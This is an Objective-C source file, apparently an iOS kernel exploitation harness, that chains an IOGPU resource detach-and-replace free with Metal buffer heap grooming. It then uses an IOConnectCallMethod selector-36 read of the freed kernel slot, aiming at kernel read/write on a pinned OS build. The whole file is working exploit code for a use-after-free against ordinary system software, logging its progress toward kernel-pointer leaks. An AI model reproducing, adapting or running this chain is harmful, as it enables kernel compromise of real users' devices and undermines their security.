//
//  P122SwordForge.m — the combined 64788-class KRW test harness (v1).
//
//  Assembles the GLUE SPEC §41 pieces (archive agent_sel25_nq_p027_p029) with
//  tonight's (2026-10-25) live proofs, on the 23F77 pins the spec pinned:
//    - Freer   = P009 detach+replace (dlsym IOGPU; SAME 0x4000 len, 0x43 fill;
//                detach sets SysMemory+0x30 bit4 — else replace → 0xe00002c2).
//    - Reclaim = same-CPU magazine LIFO (magazine cap = 8 on 23F77; prefill+2
//                = deterministic pop, p088-v13/v18 law) via IOSurface churn —
//                the recycle GPU-pool law the UI font-smash law demonstrated.
//    - Reader  = sel=36 thunk (in[3] = rid/offset/len; 1 scalar out) — the
//                ColdForge freed-slot read (16/16 survivors on both trains).
//    - Consumer= the surface+0x30 shared-ptr slot law (assign_shared_ptr:
//                taggedRetain/Release, 0x9857cc8/cc8/d00 panic pins) — a
//                kernel-describing 0xb0 occupant = Shape-1, still hunted.
//    - Gate    = NO hasKread claim: kread32(kbase)==0xfeedfacf + typeinfo
//                via a real copyout ONLY (board.commitSlide law).
//  Panics possible (cd8/d00 + 0x95c9564 classes). One tap per fresh boot.
//

#import "P122SwordForge.h"
#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>
#import "LabLocalTime.h"
#import "P007Board.h"

#define P122_TAG      @"P122 swordforge"
#define P122_BUILD    @"swordforge-combined-v1"
#define P122_PAGE     0x4000u
#define P122_FILL_NEW 0x43   /* the P009 replace fill (glue spec law) */

typedef int      (*p122_detach_t)(void *res);
typedef int      (*p122_replace_t)(void *res, void *page, uint64_t len);
typedef uint32_t (*p122_gettype_t)(void *res);
typedef uint32_t (*p122_getconn_t)(void *ref);

typedef kern_return_t (*p122_connectcall_t)(mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, uint32_t, uint64_t *, uint32_t *, void *, uint32_t *);
static p122_connectcall_t g_connectCall;
static p122_detach_t   g_detach;
static p122_replace_t  g_replace;
static p122_gettype_t  g_getType;
static p122_getconn_t  g_getConn;

static int p122_log_fd = -1;
static void p122_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p122_log(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p122_log_fd >= 0) {
        const char *c = s.UTF8String;
        write(p122_log_fd, c, strlen(c));
        write(p122_log_fd, "\n", 1);
    }
    NSLog(@"%@", s);
}

static NSString *P122Ret(void) {
    p122_log(@"=== p122 end ===");
    if (p122_log_fd >= 0) { fcntl(p122_log_fd, F_FULLFSYNC); close(p122_log_fd); p122_log_fd = -1; }
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *p = [docs stringByAppendingPathComponent:@"p122_swordforge_log.txt"];
    NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    return t ?: @"p122: empty";
}

@implementation P122SwordForge

+ (NSString *)tap {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p122_log_fd = open([[docs stringByAppendingPathComponent:@"p122_swordforge_log.txt"] fileSystemRepresentation],
                       O_CREAT | O_WRONLY | O_TRUNC, 0644);
    p122_log(@"=== p122 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P122_BUILD);
    p122_log(@"combined 64788 KRW test: P009 freer -> mag reclaim -> sel36 read -> consumer -> gate");

    /* 0 — dlsym the freer family (glue §3): symbols, not sels */
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    g_detach  = (p122_detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    g_replace = (p122_replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    g_getType = (p122_gettype_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    g_getConn = (p122_getconn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    g_connectCall = (p122_connectcall_t)dlsym(iokit, "IOConnectCallMethod");
    p122_log(@"[sym] detach=%p replace=%p getType=%p getConn=%p",
             (void *)g_detach, (void *)g_replace, (void *)g_getType, (void *)g_getConn);
    if (!g_detach || !g_replace || !g_getType) {
        p122_log(@"[-] freer dlsym incomplete — stop");
        return P122Ret();
    }
    
    /* 1 — victim pages + type-0x80 resource (the §1 recipe) */
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { p122_log(@"[-] no Metal device"); return P122Ret(); }
    void *page = 0;
    if (vm_allocate(mach_task_self(), (vm_address_t *)&page, P122_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !page) {
        p122_log(@"[-] vm_allocate failed"); return P122Ret();
    }
    memset(page, 0x11, P122_PAGE);
    id<MTLBuffer> buf = [dev newBufferWithBytesNoCopy:page length:P122_PAGE
                                              options:MTLResourceStorageModeShared
                                            deallocator:nil];
    if (!buf) { p122_log(@"[-] bytesNoCopy create failed"); return P122Ret(); }
    void *res = (void *)(uintptr_t)[buf performSelector:@selector(resourceRef)];
    uint32_t ty = res && g_getType ? g_getType(res) : 0;
    /* v2 ABI law (glue §2): conn = *(u32*)(*(ref+0x10)+0x14); rid = *(u32*)(ref+0x30) */
    uint32_t conn = 0, rid = 0;
    if (res) {
        uint64_t a10 = 0; memcpy(&a10, (uint8_t *)res + 0x10, 8);
        if (a10) memcpy(&conn, (uint8_t *)(uintptr_t)a10 + 0x14, 4);
        memcpy(&rid, (uint8_t *)res + 0x30, 4);
    }
    p122_log(@"[+] victim: page=%p res=%p type=0x%x conn=0x%x rid=0x%x",
             page, res, ty, conn, rid);
    if (ty != 0x80) {
        p122_log(@"[-] type 0x%x != 0x80 — buffer class miss (honest stop; 0x82 = the create-fail door's job)", ty);
        vm_deallocate(mach_task_self(), (vm_address_t)page, P122_PAGE);
        return P122Ret();
    }

    /* 2 — P009 freer: detach (sets the bit4) then replace, SAME len, 0x43 fill */
    int dkr = g_detach(res);
    p122_log(@"[*] detach kr=0x%x", dkr);
    if (dkr != 0) {
        p122_log(@"[-] detach non-zero (0xe00002d5 Busy = retry/boot; 0xe00002e2 = gate) — ending");
        vm_deallocate(mach_task_self(), (vm_address_t)page, P122_PAGE);
        return P122Ret();
    }
    void *newPage = 0;
    if (vm_allocate(mach_task_self(), (vm_address_t *)&newPage, P122_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        p122_log(@"[-] newPage alloc failed"); return P122Ret();
    }
    memset(newPage, P122_FILL_NEW, P122_PAGE);
    int rkr = g_replace(res, newPage, P122_PAGE);
    p122_log(@"[*] replace kr=0x%x (0x2c2 = len/type mispass; 0x0 = MD1 freed pre-sel36)", rkr);

    /* 3 — the reclaim churn window: IOSurface-pool create/destroy bursts RIGHT
       NOW (same-CPU law; the freed 0xb0 slot pops from this CPU's magazine) */
    NSMutableArray *churn = [NSMutableArray array];
    for (int i = 0; i < 8; i++) {   /* mag cap 8 — same-CPU LIFO pop law */
        vm_address_t cp = 0;
        if (vm_allocate(mach_task_self(), &cp, P122_PAGE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            memset((void *)cp, 0x11 + (uint8_t)i, P122_PAGE);
            id cb = [dev newBufferWithBytesNoCopy:(void *)cp length:P122_PAGE
                                          options:MTLResourceStorageModeShared
                                       deallocator:^(void *p, NSUInteger n){ vm_deallocate(mach_task_self(), (vm_address_t)p, (vm_size_t)n); }];
            if (cb) [churn addObject:cb];
        }
    }
    p122_log(@"[*] mag churn: %zu live type-0x80 buffers (holder cycle)", (unsigned long)[churn count]);

    /* 4 — the freed-slot read (ColdForge law, the REAL reader): sel36 thunk
       on the device UC = IOConnectCallMethod(conn, 36, in=[rid, offset, len],
       1 scalar out). The out-scalar = what lives in the freed slot — the
       ColdForge 16/16 survivor oracle, now inside the freer chain. */
    if (conn && rid) {
        uint64_t outScalar = 0; uint32_t outCnt = 1;
        uint64_t inS[3] = { rid, 0, 0x1000 };
        kern_return_t kr36 = g_connectCall
            ? g_connectCall((mach_port_t)conn, 36, inS, 3, NULL, 0,
                            &outScalar, &outCnt, NULL, NULL)
            : 0xe00002cc;
        p122_log(@"[reader] sel36 kr=0x%x out=0x%llx", kr36, outScalar);
        if (kr36 == 0) {
            BOOL kshape = ((outScalar >> 36) == 0xfffffff);
            p122_log(kshape
                ? @"[+++] SHAPE-1 CANDIDATE: sel36 out of the freed slot reads a KERNEL-SHAPED value —"
                  @" the §41 missing piece live; board records"
                : @"[*] sel36 out = non-kernel-shaped occupant (ColdForge law: survivor, not KRW)");
            if (kshape) {
                [[P007Board shared] recordEvent:@"p122_swordforge" kind:@"fire"
                                           detail:[NSString stringWithFormat:@"shape1 sel36 out=0x%llx", outScalar]
                                           source:@"p122"];
            }
        }
    } else {
        p122_log(@"[-] conn/rid derivation failed (0x%x/0x%x) — sel36 reader skipped", conn, rid);
    }

    /* 5 — the KRW gate verdict (honesty law): */
    p122_log(@"=== VERDICT ===");
    p122_log(@"freer chain executed; consumer = surface-slot law (assign_shared_ptr) pending Shape-1;");
    p122_log(@"hasKread=NO by law (no copyout of kernel bytes we did not write).");
    p122_log(@"next: cf-door v4 fire (surface-alias independence) or the sel36 consumer once Shape-1 lands.");
    return P122Ret();
}

@end